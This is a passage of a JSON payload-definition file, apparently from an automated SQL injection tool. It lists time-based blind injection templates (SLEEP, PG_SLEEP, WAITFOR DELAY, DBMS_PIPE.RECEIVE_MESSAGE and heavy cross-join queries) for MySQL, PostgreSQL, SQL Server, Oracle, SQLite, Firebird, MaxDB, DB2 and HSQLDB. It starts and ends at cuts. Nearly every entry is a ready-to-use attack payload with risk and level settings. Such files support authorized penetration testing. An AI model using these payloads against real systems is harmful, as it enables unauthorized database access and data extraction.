[RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", "risk": 1, "level": 1, "clause": [1, 2, 3], "title": "Oracle AND time-based blind", "request": {"payload": "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", "risk": 1, "level": 5, "clause": [1, 2, 3], "title": "Oracle AND time-based blind (comment)", "request": {"comment": "--", "payload": "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)", "risk": 2, "level": 2, "clause": [1, 2, 3], "title": "Oracle AND time-based blind (heavy query)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "Oracle AND time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "risk": 2, "level": 3, "clause": [1], "title": "SQLite > 2.0 AND time-based blind (heavy query)", "request": {"payload": "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "risk": 2, "level": 5, "clause": [1], "title": "SQLite > 2.0 AND time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}, {"where": [1], "vector": "AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])", "risk": 2, "level": 4, "clause": [1], "title": "Firebird AND time-based blind (heavy query)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}, {"where": [1], "vector": "AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])", "risk": 2, "level": 5, "clause": [1], "title": "Firebird AND time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}, {"where": [1], "vector": "AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)", "risk": 2, "level": 3, "clause": [1, 2, 3], "title": "SAP MaxDB AND time-based blind (heavy query)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "SAP MaxDB"}}, {"where": [1], "vector": "AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "SAP MaxDB AND time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "SAP MaxDB"}}, {"where": [1], "vector": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))", "risk": 2, "level": 3, "clause": [1, 2, 3], "title": "IBM DB2 AND time-based blind (heavy query)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "IBM DB2"}}, {"where": [1], "vector": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "IBM DB2 AND time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "IBM DB2"}}, {"where": [1], "vector": "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", "risk": 2, "level": 4, "clause": [1, 2, 3], "title": "HSQLDB >= 1.7.2 AND time-based blind (heavy query)", "request": {"payload": "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}, {"where": [1], "vector": "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}, {"where": [1], "vector": "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", "risk": 2, "level": 4, "clause": [1, 2, 3], "title": "HSQLDB > 2.0 AND time-based blind (heavy query)", "request": {"payload": "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}, {"where": [1], "vector": "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "HSQLDB > 2.0 AND time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}, {"where": [2], "vector": "OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "risk": 3, "level": 2, "clause": [1, 2, 3], "title": "MySQL > 5.0.11 OR time-based blind", "request": {"payload": "OR [RANDNUM]=SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "MySQL", "dbms_version": "> 5.0.11"}}, {"where": [2], "vector": "OR [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "risk": 3, "level": 4, "clause": [1, 2, 3], "title": "MySQL < 5.0.12 OR time-based blind (heavy query)", "request": {"payload": "OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "MySQL"}}, {"where": [2], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "risk": 3, "level": 3, "clause": [1, 2, 3], "title": "PostgreSQL > 8.1 OR time-based blind", "request": {"payload": "OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}, {"where": [2], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "risk": 3, "level": 4, "clause": [1, 2, 3], "title": "PostgreSQL OR time-based blind (heavy query)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "PostgreSQL"}}, {"where": [2], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)", "risk": 3, "level": 3, "clause": [1, 2, 3], "title": "Microsoft SQL Server/Sybase OR time-based blind (heavy query)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [2], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", "risk": 3, "level": 3, "clause": [1, 2, 3], "title": "Oracle OR time-based blind", "request": {"payload": "OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [2], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)", "risk": 3, "level": 4, "clause": [1, 2, 3], "title": "Oracle OR time-based blind (heavy query)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [2], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "risk": 3, "level": 4, "clause": [1], "title": "SQLite > 2.0 OR time-based blind (heavy query)", "request": {"payload": "OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}, {"where": [2], "vector": "OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])", "risk": 3, "level": 5, "clause": [1], "title": "Firebird OR time-based blind (heavy query)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}, {"where": [2], "vector": "OR [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)", "risk": 3, "level": 4, "clause": [1, 2, 3], "title": "SAP MaxDB OR time-based blind (heavy query - comment)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "SAP MaxDB"}}, {"where": [2], "vector": "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))", "risk": 3, "level": 4, "clause": [1, 2, 3], "title": "IBM DB2 OR time-based blind (heavy query)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "IBM DB2"}}, {"where": [1], "vector": "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", "risk": 2, "level": 4, "clause": [1, 2, 3], "title": "HSQLDB >= 1.7.2 OR time-based blind (heavy query)", "request": {"payload": "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}, {"where": [1], "vector": "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}, {"where": [1], "vector": "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", "risk": 2, "level": 4, "clause": [1, 2, 3], "title": "HSQLDB > 2.0 OR time-based blind (heavy query)", "request": {"payload": "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}, {"where": [1], "vector": "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "HSQLDB > 2.0 OR time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))", "risk": 1, "level": 3, "clause": [1, 2, 3], "title": "MySQL >= 5.0 time-based blind - Parameter replace", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))", "risk": 2, "level": 4, "clause": [1, 2, 3], "title": "MySQL < 5.0 time-based blind - Parameter replace (heavy queries)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "([INFERENCE])*SLEEP([SLEEPTIME])", "risk": 1, "level": 4, "clause": [1, 2, 3], "title": "MySQL time-based blind - Parameter replace (bool*int)", "request": {"payload": "([RANDNUM]=[RANDNUM])*SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))", "risk": 1, "level": 5, "clause": [1, 2, 3], "title": "MySQL time-based blind - Parameter replace (MAKE_SET)", "request": {"payload": "MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "ELT([INFERENCE],SLEEP([SLEEPTIME]))", "risk": 1, "level": 5, "clause": [1, 2, 3], "title": "MySQL time-based blind - Parameter replace (ELT)", "request": {"payload": "ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "risk": 1, "level": 3, "clause": [1, 2, 3], "title": "PostgreSQL > 8.1 time-based blind - Parameter replace", "request": {"payload": "(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}, {"where": [3], "vector": "(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "risk": 2, "level": 4, "clause": [1, 2, 3], "title": "PostgreSQL time-based blind - Parameter replace (heavy query)", "request": {"payload": "(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "PostgreSQL"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))", "risk": 1, "level": 3, "clause": [1, 3], "title": "Microsoft SQL Server/Sybase time-based blind - Parameter replace", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))", "risk": 2, "level": 4, "clause": [1, 3], "title": "Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [3], "vector": "BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;", "risk": 0, "level": 3, "clause": [1, 3], "title": "Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)", "request": {"payload": "BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)", "risk": 1, "level": 3, "clause": [1, 3], "title": "Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)", "risk": 2, "level": 4, "clause": [1, 3], "title": "Oracle time-based blind - Parameter replace (heavy queries)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END))", "risk": 2, "level": 4, "clause": [1, 2, 3], "title": "SQLite > 2.0 time-based blind - Parameter replace (heavy query)", "request": {"payload": "(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}, {"where": [3], "vector": "IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "Firebird time-based blind - Parameter replace (heavy query)", "request": {"payload": "(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}, {"where": [3], "vector": "(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)", "risk": 2, "level": 5, "clause": [1, 3], "title": "SAP MaxDB time-based blind - Parameter replace (heavy query)", "request": {"payload": "(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "SAP MaxDB"}}, {"where": [3], "vector": "(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "IBM DB2 time-based blind - Parameter replace (heavy query)", "request": {"payload": "(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "IBM DB2"}}, {"where": [1], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)", "risk": 2, "level": 4, "clause": [1, 2, 3], "title": "HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 